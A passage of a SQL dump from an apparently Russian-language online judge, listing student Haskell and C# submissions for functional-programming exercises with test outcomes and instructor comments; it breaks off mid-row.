(3425, 98, '2562137', '2012-11-12 19:59:51', 1, 'data Tree = Node Char Tree Tree | Empty deriving Show\r\n\r\n\r\n\r\ntoStr Empty = "x"\r\n\r\ntoStr (Node c l r) = c : (toStr l ++ toStr r)\r\n\r\n\r\n\r\nfromStr str = fst (f str)\r\n\r\n\r\n\r\nf (c:str) =\r\n\r\n	if c == ''x'' then (Empty, str)\r\n\r\n	else (Node c l r, s2)\r\n\r\n	where\r\n\r\n		p1 = f str\r\n\r\n		l = fst p1\r\n\r\n		s1 = snd p1\r\n\r\n		p2 = f s1\r\n\r\n		r = fst p2\r\n\r\n		s2 = snd p2\r\n\r\n\r\n\r\ntest = (\r\n\r\n	toStr (Node ''a'' (Node ''b'' Empty (Node ''a'' Empty Empty)) Empty)\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3426, 83, '4837959', '2012-11-12 20:01:12', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n \r\n\r\nclass Program\r\n\r\n{\r\n\r\n    static void Main()\r\n\r\n    {\r\n\r\n        foreach (int i in Lst239())\r\n\r\n        {\r\n\r\n            Console.WriteLine(i);\r\n\r\n            if (i > 1000)\r\n\r\n                break;\r\n\r\n        }\r\n\r\n    }\r\n\r\n    public static IEnumerable<int> Lst239()\r\n\r\n    {\r\n\r\n        yield return 2;\r\n\r\n        yield return 3;\r\n\r\n        yield return 9;\r\n\r\n        foreach (int i in Lst239())\r\n\r\n        {\r\n\r\n            yield return i * 10 + 2;\r\n\r\n            yield return i * 10 + 3;\r\n\r\n            yield return i * 10 + 9;\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3427, 84, '4837959', '2012-11-12 20:11:50', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n \r\n\r\nclass Program\r\n\r\n{\r\n\r\n  static void Main()\r\n\r\n  {\r\n\r\n    foreach (double x in Iterate(2, x => x * 2))\r\n\r\n    {\r\n\r\n      Console.WriteLine(x);\r\n\r\n      if (x > 10000)\r\n\r\n        break;\r\n\r\n    }\r\n\r\n\r\n\r\n    int i = 0;\r\n\r\n    foreach (double x in Iterate(1, Math.Sin))\r\n\r\n    {\r\n\r\n      Console.WriteLine(x);\r\n\r\n      if (i++ == 100)\r\n\r\n        break;\r\n\r\n    }\r\n\r\n  }\r\n\r\n  public static IEnumerable<double> Iterate(double x, Func<double, double> f)\r\n\r\n  {\r\n\r\n    yield return x;\r\n\r\n    foreach (double y in Iterate(f(x), f))\r\n\r\n    {\r\n\r\n      yield return y;\r\n\r\n    };\r\n\r\n  }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3428, 85, '1705225', '2012-11-12 20:23:55', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Show Ration where\r\n	show (Rat x y) = show x ++ "/" ++ show y\r\n	\r\ninstance Eq Ration where\r\n	Rat x1 y1 == Rat x2 y2 = x1*y2 == x2*y1\r\n\r\ninstance Num Ration where \r\n	(Rat x1 y1) + (Rat x2 y2) = Rat (x1*y2 + x2*y1) (y1*y2)\r\n	(Rat x1 y1) * (Rat x2 y2) = Rat (x1*x2) (y1*y2)\r\n	\r\ninstance Ord Ration where\r\n	(Rat x1 y1) < (Rat x2 y2) = if (y1*y2 > 0) then (x2*y1 > x1*y2) else (x1*y2 > x2*y1)\r\n	(Rat x1 y1) > (Rat x2 y2) = if (y1*y2 > 0) then (x1*y2 > x2*y1) else (x2*y1 > x1*y2)\r\n', '<br/>Тесты успешно пройдены!'),
(3429, 91, 'artyushov', '2012-11-12 20:43:16', 1, 'merge [] y = y\r\nmerge x [] = x\r\n\r\nmerge (x:xs) (y:ys) = \r\n	if (x < y) \r\n		then x : (merge xs (y:ys))\r\n		else if (x > y) \r\n			then y : (merge (x:xs) ys)\r\n			else x : (merge xs ys)', '<br/>Тесты успешно пройдены!'),
(3430, 82, '51559263', '2012-11-12 20:46:11', 2, '  --- Нет, как не странно, все еще мне удалось найти тест, к котором неправильные результаты\r\n  --- (я, честно говоря, думал, что существующие тесту достаточно полные..)\r\n  --- Вот такой тест \r\n  ---   countDifferentVars [(1,2),(2,3),(4,5),(1,4)] [1,2,3,4]\r\n  --- Получается 3, а дб 1\r\n  --- (Тут не строки, а числа, но это не важно, если заменить из на строки, ответ такой же)\r\n  --- Попробуйте исправить, теперь, скажем, до четверга включительно.\r\n  --- (А я сейчас добавлю этот тест)\r\nallPairs [] = []\r\n\r\n\r\n\r\nallPairs (x : xs) = zip ( map (  _ -> x ) xs ) xs ++ ( allPairs xs )\r\n\r\n\r\n\r\nbasePairs xs = foldr \r\n\r\n                    (  (x,y) ys -> let \r\n\r\n                                       lst = foldr (  (a,b) ps -> a : b : ps ) [] ys\r\n\r\n                                    in  \r\n\r\n                                       if ( (elem x lst) && (elem y lst) ) \r\n\r\n                                       then ys\r\n\r\n                                       else (x,y) : ys ) \r\n\r\n                    [] \r\n\r\n                    xs\r\n\r\n\r\n\r\nfullEqualSystem xs = foldr \r\n\r\n                          (  (x,y) ys -> (foldr \r\n\r\n                                                (  (a,b) ps -> if a == x\r\n\r\n                                                                then (b,y) : (y,b) : ps\r\n\r\n                                                                else if a == y\r\n\r\n                                                                     then (b,x) : (x,b) : ps\r\n\r\n                                                                     else ps ) \r\n\r\n                                                [(x,y),(y,x)] \r\n\r\n                                                ys) ++ ys ) \r\n\r\n                          [] \r\n\r\n                          xs\r\n\r\n\r\n\r\nallDifferent xs = foldr (  x ys -> x : filter (/=x) ys ) [] xs\r\n\r\n\r\n\r\nintersect xs ys = filter (  x -> elem x xs ) ys\r\n\r\n\r\n\r\ncountDifferentVars xs ys = let \r\n\r\n                               diffs = allDifferent ys\r\n\r\n                           in \r\n\r\n                               length diffs - length ( basePairs ( intersect (allPairs diffs) (fullEqualSystem xs) ) )\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3431, 89, 'artyushov', '2012-11-12 20:51:05', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten Empty = []\r\nflatten (Node i left right) = (i : (flatten left)) ++ (flatten right)\r\n', '<br/>Тесты успешно пройдены!'),
(3432, 95, '472848', '2012-11-12 20:51:25', 1, 'public partial class Program\r\n{\r\n  public static bool allDifferent(int[] a)\r\n  {\r\n    return allDifferent1(a, 0, t => true);\r\n  }\r\n\r\n  public static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n  {\r\n    if (from == a.Length) return true;\r\n    if (!cond(a[from])) return false;\r\n    return allDifferent1(a, from + 1, i => cond(i) & i != a[from]);\r\n  }\r\n\r\n  static void Main(string[] args)\r\n  {\r\n    int[] a1 = { 1, 2, 3, 4, 6, 1 };\r\n    int[] a2 = { 1, 2, 3 };\r\n    int[] a3 = { 1, 1 };\r\n    int[] a4 = { 1 };\r\n    int[] a5 = { };\r\n    Console.WriteLine(allDifferent(a1)); //False\r\n    Console.WriteLine(allDifferent(a2)); //True\r\n    Console.WriteLine(allDifferent(a3)); //False\r\n    Console.WriteLine(allDifferent(a4)); //True\r\n    Console.WriteLine(allDifferent(a5)); //True\r\n  }\r\n}', '<br/>Тесты успешно пройдены!'),
(3433, 86, '472848', '2012-11-12 21:00:56', 0, 'allNondivisible li = g li (x -> True)\r\n\r\ng [] _ = True\r\ng (x:xs) pred = if (not (pred x)) then False else g xs (y -> pred y && mod y x /= 0 && mod x y /= 0', 'Не удалось вычислить выражение "allNondivisible [2, 7, 6, 5]", проверьте правильность синтаксиса'),
(3434, 86, '472848', '2012-11-12 21:01:16', 0, 'allNondivisible li = g li (x -> True)\r\n\r\ng [] _ = True\r\ng (x:xs) pred = if (not (pred x)) then False else g xs (y -> pred y && mod y x /= 0 && mod x y /= 0', 'Не удалось вычислить выражение "allNondivisible [2, 7, 6, 5]", проверьте правильность синтаксиса'),
(3435, 86, '472848', '2012-11-12 21:03:57', 1, 'allNondivisible li = g li (x -> True)\r\n\r\ng [] _ = True\r\ng (x:xs) pred = if (not (pred x)) then False else g xs (y -> pred y && mod y x /= 0 && mod x y /= 0)', '<br/>Тесты успешно пройдены!'),
(3436, 89, 'code', '2012-11-12 21:13:56', 0, 'ata Tree a = Empty | Node a (Tree a) (Tree a) \r\n\r\nflatten :: Tree a -> [a] \r\nflatten t = flatten2 t [] \r\n  where \r\n    --flatten2 tree ans \r\n    flatten2 Empty          ans = ans \r\n    flatten2 (Node x lt rt) ans = x : flatten2 lt (flatten2 rt ans)', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса'),
(3437, 89, 'code', '2012-11-12 21:15:57', 0, 'ata Tree a = Empty | Node a (Tree a) (Tree a) \r\n\r\nflatten :: Tree a -> [a] \r\nflatten t = flatten2 t [] \r\n  where \r\n    flatten2 Empty          ans = ans \r\n    flatten2 (Node x lt rt) ans = x : flatten2 lt (flatten2 rt ans)', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса'),
(3438, 97, 'artyushov', '2012-11-12 21:34:10', 1, 'checkBrackets [] = True\r\ncheckBrackets x = checkBrackets1 x []\r\n\r\ncheckBrackets1 [] [] = True\r\ncheckBrackets1 (x:xs) [] = checkBrackets1 xs [x]\r\ncheckBrackets1 (x:xs) (s:stack)\r\n	| x == ''['' || x == ''('' = checkBrackets1 xs (x:s:stack)\r\n	| x == '']'' && s == ''['' = checkBrackets1 xs stack\r\n	| x == '')'' && s == ''('' = checkBrackets1 xs stack\r\n	| otherwise 			= False \r\ncheckBrackets1 x y = False\r\n', '<br/>Тесты успешно пройдены!'),
(3439, 89, 'code', '2012-11-12 22:28:02', 2, '   --- тут тоже надо дописать тип и исправить опечатку. Тоже, это просто, но сделайте, пожалуйста.\r\nlatten :: Tree a -> [a]   \r\nflatten t = flatten2 t []   \r\n\r\nflatten2 :: Tree a -> [a] -> [a] \r\nflatten2 Empty ans = ans   \r\nflatten2 (Node x lt rt) ans = x : flatten2 lt (flatten2 rt ans)	\r\n', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса'),
(3440, 88, 'code', '2012-11-12 22:36:25', 1, 'data Expr = N Integer\r\n          | X\r\n          | Add  Expr Expr\r\n          | Sub  Expr Expr\r\n          | Mult Expr Expr\r\n          | Div  Expr Expr\r\n  deriving Show\r\n            \r\ndiff :: Expr -> Expr\r\ndiff (N _)      = N 0\r\ndiff  X         = N 1\r\ndiff (Add  a b) = Add (diff a) (diff b)\r\ndiff (Sub  a b) = Sub (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b))\r\ndiff (Div  a b) = Div (Sub (Mult (diff a) b) (Mult a (diff b))) \r\n                      (Mult b b)', '<br/>Тесты успешно пройдены!'),
(3441, 89, '132727093', '2012-11-12 22:38:24', 0, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\nflatten :: (Tree a) -> [a]\r\nflatten Empty=[]\r\nflatten (Node n a b) = [n] ++ flatten a ++ flatten b', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3442, 89, '132727093', '2012-11-12 22:38:33', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\nflatten :: (Tree a) -> [a]\r\nflatten Empty=[]\r\nflatten (Node n a b) = [n] ++ flatten a ++ flatten b', '<br/>Тесты успешно пройдены!'),
(3443, 87, 'code', '2012-11-12 22:39:42', 0, 'eval :: Expr -> Integer -> Integer\r\neval (N n)      _ = n\r\neval  X         x = x\r\neval (Add  a b) x = eval a x + eval b x\r\neval (Sub  a b) x = eval a x - eval b x \r\neval (Mult a b) x = eval a x * eval b x\r\neval (Div  a b) x = eval a x `div` eval b x', 'Не удалось вычислить выражение "eval (Add (N 3) (Mult X X)) 10", проверьте правильность синтаксиса'),
(3444, 87, 'code', '2012-11-12 22:43:45', 2, '   --- Надо, естественно, описать тип. Это просто, но опишите, пожалуйста.\r\neval :: Expr -> Double -> Double\r\neval (N n)      _ = n\r\neval  X         x = x\r\neval (Add  a b) x = eval a x + eval b x\r\neval (Sub  a b) x = eval a x - eval b x \r\neval (Mult a b) x = eval a x * eval b x\r\neval (Div  a b) x = eval a x / eval b x', 'Не удалось вычислить выражение "eval (Add (N 3) (Mult X X)) 10", проверьте правильность синтаксиса'),
(3445, 85, 'code', '2012-11-12 22:46:34', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Eq Ration where\r\n  Rat a b == Rat c d = a*d == b*c\r\n  \r\ninstance Show Ration where\r\n  show (Rat a b) = show a ++ ''/'' : show b\r\n  \r\ninstance Ord Ration where\r\n  Rat a b < Rat c d = if b*d < 0 then a*d > b*c \r\n                                 else a*d < b*c\r\n  \r\n\r\ninstance Num Ration where\r\n  Rat a b + Rat c d = Rat (num1 + num2) common\r\n    where \r\n      common = lcm b d\r\n      num1   = a * common `div` b\r\n      num2   = c * common `div` d', '<br/>Тесты успешно пройдены!'),
(3446, 88, 'erwert', '2012-11-13 00:00:43', 0, 'diff X = N 1\r\ndiff (N a) = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult a (diff b)) (Mult b (diff a))', 'Не удалось вычислить выражение "diff (Mult X X)", проверьте правильность синтаксиса'),
(3447, 88, 'erwert', '2012-11-13 00:01:16', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving(Show, Eq)\r\ndiff X = N 1\r\ndiff (N a) = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult a (diff b)) (Mult b (diff a))', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3448, 88, 'erwert', '2012-11-13 00:03:30', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving(Show, Eq)\r\ndiff X = N 1\r\ndiff (N a) = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b))', '<br/>Тесты успешно пройдены!'),
(3449, 99, '6774563', '2012-11-13 09:17:38', 1, '﻿using System;\r\n\r\n\r\n\r\nnamespace task26_1\r\n\r\n{\r\n\r\n    internal abstract class Expr\r\n\r\n    {\r\n\r\n        public abstract double Eval(double x);\r\n\r\n\r\n\r\n        public abstract Expr Diff();\r\n\r\n    }\r\n\r\n\r\n\r\n    internal sealed class N : Expr\r\n\r\n    {\r\n\r\n        private readonly int _n;\r\n\r\n\r\n\r\n        public N(int n)\r\n\r\n        {\r\n\r\n            _n = n;\r\n\r\n        }\r\n\r\n\r\n\r\n        public override double Eval(double x)\r\n\r\n        {\r\n\r\n            return _n;\r\n\r\n        }\r\n\r\n\r\n\r\n        public override Expr Diff()\r\n\r\n        {\r\n\r\n            return new N(0);\r\n\r\n        }\r\n\r\n\r\n\r\n        public override string ToString()\r\n\r\n        {\r\n\r\n            return _n.ToString();\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    internal sealed class X : Expr\r\n\r\n    {\r\n\r\n        public override double Eval(double x)\r\n\r\n        {\r\n\r\n            return x;\r\n\r\n        }\r\n\r\n\r\n\r\n        public override Expr Diff()\r\n\r\n        {\r\n\r\n            return new N(1);\r\n\r\n        }\r\n\r\n\r\n\r\n        public override string ToString()\r\n\r\n        {\r\n\r\n            return "x";\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    internal sealed class Add : Expr\r\n\r\n    {\r\n\r\n        private readonly Expr _expr1;\r\n\r\n        private readonly Expr _expr2;\r\n\r\n\r\n\r\n        public Add(Expr expr1, Expr expr2)\r\n\r\n        {\r\n\r\n            _expr1 = expr1;\r\n\r\n            _expr2 = expr2;\r\n\r\n        }\r\n\r\n\r\n\r\n        public override double Eval(double x)\r\n\r\n        {\r\n\r\n            return _expr1.Eval(x) + _expr2.Eval(x);\r\n\r\n        }\r\n\r\n\r\n\r\n        public override Expr Diff()\r\n\r\n        {\r\n\r\n            return new Add(_expr1.Diff(), _expr2.Diff());\r\n\r\n        }\r\n\r\n\r\n\r\n        public override string ToString()\r\n\r\n        {\r\n\r\n            return String.Format("({0} + {1})", _expr1, _expr2);\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    internal sealed class Mult : Expr\r\n\r\n    {\r\n\r\n        private readonly Expr _expr1;\r\n\r\n        private readonly Expr _expr2;\r\n\r\n\r\n\r\n        public Mult(Expr expr1, Expr expr2)\r\n\r\n        {\r\n\r\n            _expr1 = expr1;\r\n\r\n            _expr2 = expr2;\r\n\r\n        }\r\n\r\n\r\n\r\n        public override double Eval(double x)\r\n\r\n        {\r\n\r\n            return _expr1.Eval(x) * _expr2.Eval(x);\r\n\r\n        }\r\n\r\n\r\n\r\n        public override Expr Diff()\r\n\r\n        {\r\n\r\n            return new Add(new Mult(_expr1.Diff(), _expr2), new Mult(_expr1, _expr2.Diff()));\r\n\r\n        }\r\n\r\n\r\n\r\n        public override string ToString()\r\n\r\n        {\r\n\r\n            return String.Format("{0} * {1}", _expr1, _expr2);\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    internal sealed class Program\r\n\r\n    {\r\n\r\n        public static void Main()\r\n\r\n        {\r\n\r\n            Console.WriteLine(new Add(new Mult(new X(), new N(32)), new X()).Diff());\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3450, 87, '419046', '2012-11-13 09:56:54', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval X x = x\r\n\r\neval (N i) x = i\r\n\r\neval (Add e1 e2) x = (eval e1 x) + (eval e2 x)\r\n\r\neval (Mult e1 e2) x = (eval e1 x) * (eval e2 x) \r\n\r\n \r\n', '<br/>Тесты успешно пройдены!'),
(3451, 88, '419046', '2012-11-13 10:09:23', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = (N 1)\r\n\r\ndiff (N i) = (N 0)\r\n\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2) \r\n\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e2 (diff e1))\r\n', '<br/>Тесты успешно пройдены!'),
(3452, 97, 'code', '2012-11-13 10:43:31', 1, 'checkBrackets :: String -> Bool\r\ncheckBrackets s = check s ""\r\n  where\r\n    check (c:s) stack = \r\n      case c of\r\n        ''('' -> check s ('')'':stack)\r\n        ''['' -> check s ('']'':stack)\r\n        c   -> not (null stack) && c == head stack && check s (tail stack)\r\n    check  []   stack = null stack', '<br/>Тесты успешно пройдены!'),
(3453, 98, 'tonyo', '2012-11-13 10:50:09', 2, '  --- Не совсем так, вот такой тест не проходит:\r\n  ---   fromStr(toStr(Node ''a'' (Node ''b''  Empty Empty) (Node ''b''  Empty Empty) ))\r\n  --- (Я его сейчас добавлю)\r\ndata Tree = Empty | Node Char Tree Tree \r\n  deriving Show\r\n\r\n\r\ntoStr Empty = "*"\r\ntoStr (Node ch lc rc) = "(" ++  ch : [] ++ " " ++ toStr lc ++ " " ++ toStr rc ++ ")"\r\n\r\nfromStr (''*'': str) = Empty\r\nfromStr (''('' : ch : '' '': str)  = Node ch (fromStr str) (fromStr str2)\r\n  where str2 = getRightChild str \r\n\r\ngetRightChild (x:xs) =  if x == '' '' \r\n                        then xs\r\n                        else getRightChild xs', '<br/>Тесты успешно пройдены!'),
(3454, 85, '3742311', '2012-11-13 10:59:22', 2, 'data Ration = Rat Integer Integer\r\n\r\ninstance Num Ration where\r\n  (Rat a b) + (Rat c d) = (a * d + b * c) / (b * d)\r\n     --- Это у вас поучается, что результат сложения не дробь, а вещественное число (справа у вас написано не совсем то..)\r\n\r\ninstance Eq Ration where\r\n  (Rat a b) == (Rat c d) = a * d == b * c\r\n\r\ninstance Ord Ration where\r\n  (Rat a b) < (Rat c d) = a * d < b * c  --- Это на самом деле не совсем правильно в некоторых случаях. Ну, попроьуйте запустить тесты, увидите в чем проблема)\r\n\r\ninstance Show Ration where\r\n  show (Rat a b) = (show a) ++ (''/'':(show b))', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3455, 98, 'code', '2012-11-13 10:59:22', 1, '   --- Не понимаю, почему не компилируется, все вроде правильно\r\ndata Tree = Node Char Tree Tree | Empty\r\n  deriving Show\r\n           \r\ntoStr :: Tree -> String\r\ntoStr Empty = "e"\r\ntoStr (Node c tl tr) = c : toStr tl ++ '')'' : toStr tr ++ "]"\r\n  \r\nfromStr :: String -> Tree  \r\nfromStr s = go s [] where\r\n  go (''e'':s) stack = go s (Empty:stack)\r\n  go ('')'':s) (tl:(Node c _  _):stack) = go s ((Node c tl Empty):stack)\r\n  go ('']'':s) (tr:(Node c tl _):stack) = go s ((Node c tl tr   ):stack)\r\n  go ( c :s) stack = go s ((Node c Empty Empty):stack)\r\n  go   []    [s]   = s', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(3456, 99, '472848', '2012-11-13 11:41:41', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace C_Sharp\r\n\r\n{\r\n\r\n    public partial class Program\r\n\r\n    {\r\n\r\n        abstract class Expr \r\n\r\n        {\r\n\r\n            public abstract string ToString();\r\n\r\n        }\r\n\r\n\r\n\r\n        class X : Expr\r\n\r\n        {\r\n\r\n            public override string ToString()\r\n\r\n            {\r\n\r\n                return "X";\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        class N : Expr\r\n\r\n        {\r\n\r\n            public int Val;\r\n\r\n            public N(int i)\r\n\r\n            {\r\n\r\n                Val = i;\r\n\r\n            }\r\n\r\n            public override string ToString()\r\n\r\n            {\r\n\r\n                return "(N " + Val.ToString() + ")";\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        class Add : Expr\r\n\r\n        {\r\n\r\n            public Expr First;\r\n\r\n            public Expr Second;\r\n\r\n            public Add(Expr e1, Expr e2) \r\n\r\n            { \r\n\r\n                First = e1; \r\n\r\n                Second = e2; \r\n\r\n            }\r\n\r\n            public override string ToString()\r\n\r\n            {\r\n\r\n                return "(Add " + First.ToString() + " " + Second.ToString() + ")";\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        class Mult : Expr\r\n\r\n        {\r\n\r\n            public Expr First;\r\n\r\n            public Expr Second;\r\n\r\n            public Mult(Expr e1, Expr e2) \r\n\r\n            { \r\n\r\n                First = e1; \r\n\r\n                Second = e2; \r\n\r\n            }\r\n\r\n            public override string ToString()\r\n\r\n            {\r\n\r\n                return "(Mult " + First.ToString() + " " + Second.ToString() + ")";\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static Expr Diff(Expr e)\r\n\r\n        {\r\n --- На самом деле это методически не очень правильно, мне кажется.\r\n --- Если у вас в выражение добавиться новый тип (например, вычитание) то вам придется\r\n --- не забыть добавить сюда еще один if (и вы наверняка забудете )) )\r\n --- Лучше, мне кажется, в Expr обьявить метод Diff и везде его переопределять.\r\n            if (e.GetType() == typeof(X)) return new N(1);\r\n\r\n            if (e.GetType() == typeof(N)) return new N(0);\r\n\r\n            var a = e as Add;\r\n\r\n            if (a != null) return new Add(Diff(a.First), Diff(a.Second));\r\n\r\n            var m = e as Mult;\r\n\r\n            if (m != null) return new Add(new Mult(Diff(m.First), m.Second), new Mult(m.First, Diff(m.Second)));\r\n\r\n            return null;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Expr e = new Mult(new X(), new X());\r\n\r\n            Console.WriteLine(e.ToString());\r\n\r\n            Console.WriteLine(Diff(e).ToString());\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3457, 88, '472848', '2012-11-13 11:42:23', 0, '', 'Не удалось вычислить выражение "diff (Mult X X)", проверьте правильность синтаксиса'),
(3458, 88, '472848', '2012-11-13 11:47:14', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\ndiff (N i) = N 0\r\n\r\ndiff (X)   = N 1\r\n\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\n\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\r\n', '<br/>Тесты успешно пройдены!'),
(3459, 87, '472848', '2012-11-13 11:47:34', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\neval (N i) _ = i\r\n\r\neval X i = i\r\n\r\neval (Mult e1 e2) i = (eval e1 i) * (eval e2 i)\r\n\r\neval (Add e1 e2) i = (eval e1 i) + (eval e2 i)\r\n', '<br/>Тесты успешно пройдены!'),
(3460, 90, 'erwert', '2012-11-13 12:39:33', 1, '   --- ОК, но так не очень просто потом что-то сделать с ответом (умножить его на 2 например)\r\n   --- Мы это обсудим\r\nfindSame [] = "Numeric is not found."\r\nfindSame (h:hs) \r\n	| elem h hs = show h\r\n	| otherwise = findSame hs', '<br/>Тесты успешно пройдены!'),
(3461, 98, 'tonyo', '2012-11-13 12:43:51', 0, 'data Tree = Empty | Node Char Tree Tree \r\n  deriving Show\r\n\r\n\r\ntoStr Empty = "*" \r\ntoStr (Node ch lc rc) = "(" ++  ch : [] ++ " " ++ toStr lc ++ " " ++ toStr rc ++ ")" \r\n\r\nfromStr (''*'': str) = Empty\r\nfromStr (''('' : ch : '' '': str)  = Node ch (fromStr str) (fromStr str2)\r\n  where str2 = getRightChild str \r\n\r\ngetRightChild (''*'':xs) = tail xs\r\ngetRightChild (''('':xs) = getRightChild1 xs (-1)\r\ngetRightChild1 (x:xs) val \r\n  | x == '')'' && val == -1 = tail xs\r\n  | x == ''('' = getRightChild1 xs (val-1)\r\n  | x == ''('' = getRightChild1 xs (val+1)\r\n  | otherwise = getRightChild1 xs val', '<br/>Тесты успешно пройдены!'),
(3462, 86, 'jogrms', '2012-11-13 13:09:04', 1, ' --- Ну, это вовсе те то, что имелось в виду, но ОК, засчитывается за то что тоже замысловато напмсано)\r\ntype Set = Integer -> Bool\r\ntype Set2d = Integer -> Set\r\n\r\nallNondivisible lst = all (section lst $ exclude $ quad $ fromList lst) lst\r\n    where\r\n        mult :: Set -> Set -> Set2d\r\n        mult s1 s2 e1 e2 = s1 e1 && s2 e2\r\n\r\n        quad :: Set -> Set2d\r\n        quad s = mult s s\r\n\r\n        exclude :: Set2d -> Set2d\r\n        exclude s e1 e2 = s e1 e2 && ((e1 == e2) || (mod e1 e2 /= 0))\r\n\r\n        section :: [Integer] -> Set2d -> Set\r\n        section l s e = all (s e) l\r\n\r\n        fromList :: [Integer] -> Set\r\n        fromList = flip elem', '<br/>Тесты успешно пройдены!'),
(3463, 89, '472848', '2012-11-13 13:32:30', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten t = f [] t []\r\n\r\nf _ (Empty) _ = []\r\nf [] (Node i Empty Empty) res = i:res\r\nf (t:par) (Node i Empty Empty) res = f par t (i:res)\r\nf par (Node i t1 Empty) res = f ((Node i Empty Empty):par) t1 res\r\nf par (Node i t1 t2) res = f ((Node i t1 Empty):par) t2 res', '<br/>Тесты успешно пройдены!'),
(3464, 95, 'tonyo', '2012-11-13 13:46:56', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\npublic class Pr24_1\r\n\r\n{\r\n\r\n\r\n\r\n\r\n\r\n  public static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n\r\n  {\r\n\r\n    if (a.Length == from)\r\n\r\n      return true;\r\n\r\n\r\n\r\n    if (cond(a[from]))\r\n\r\n      return allDifferent1(a, from+1, t => (cond(t) && t != a[from]));\r\n\r\n    else\r\n\r\n      return false;\r\n\r\n  }\r\n\r\n\r\n\r\n\r\n\r\n  public static bool allDifferent(int[] a)\r\n\r\n  {\r\n\r\n    return allDifferent1(a, 0, t => true);\r\n\r\n  }\r\n\r\n\r\n\r\n\r\n\r\n  public static void Main()\r\n\r\n  {\r\n\r\n    int[] a = {1,2,3,4,5,4};\r\n\r\n    Console.WriteLine(allDifferent(a));\r\n\r\n  }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3465, 96, 'tonyo', '2012-11-13 15:59:53', 2, '   --- В принципе правильно, но давайте я вас попрошу немного исправить.\r\n   --- Было бы замечательно, если бы эта функция работала и с бесконечными IEnumeraиду\r\n   --- (Ну, например, берем последовательности 1?2?4?8?16,... и 1,3,9,27,...\r\n   --- и сливаем их) Попробуйте, для этого просто надо вместо Length использовать что-то другое.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\npublic class Pr24_2\r\n\r\n{\r\n\r\n\r\n\r\n  public static IEnumerable<int> Merge(int[] a, int[] b)\r\n\r\n  {\r\n\r\n    int i = 0, j = 0;\r\n\r\n    int la = a.Length, lb = b.Length;\r\n\r\n\r\n\r\n    while (i < la && j < lb)\r\n\r\n    {\r\n\r\n      if (a[i] == b[j])\r\n\r\n        i++;\r\n\r\n\r\n\r\n      if (a[i] < b[j])\r\n\r\n        yield return a[i++];\r\n\r\n      else \r\n\r\n        yield return b[j++];\r\n\r\n    }\r\n\r\n\r\n\r\n    while (i < la) 